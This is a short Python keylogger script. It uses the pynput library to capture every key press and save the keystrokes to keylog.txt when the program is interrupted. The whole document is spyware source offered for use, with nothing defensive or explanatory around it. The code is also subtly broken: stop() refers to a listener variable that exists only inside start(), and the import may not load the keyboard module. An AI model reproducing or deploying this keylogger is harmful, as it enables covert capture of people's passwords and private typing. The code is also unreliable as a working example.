import pynput

class Keylogger(object):
    def __init__(self):
        self.log = []
        self.keyboard = pynput.keyboard.Controller()

    def start(self):
        listener = pynput.keyboard.Listener(on_press=self.on_press)
        listener.start()

    def on_press(self, key):
        self.log.append(key)

    def stop(self):
        listener.stop()

    def get_log(self):
        return self.log

if __name__ == "__main__":
    logger = Keylogger()
    logger.start()
    try:
        while True:
            pass
    except KeyboardInterrupt:
        logger.stop()
        with open("keylog.txt", "w") as f:
            for key in logger.get_log():
                f.write(str(key))
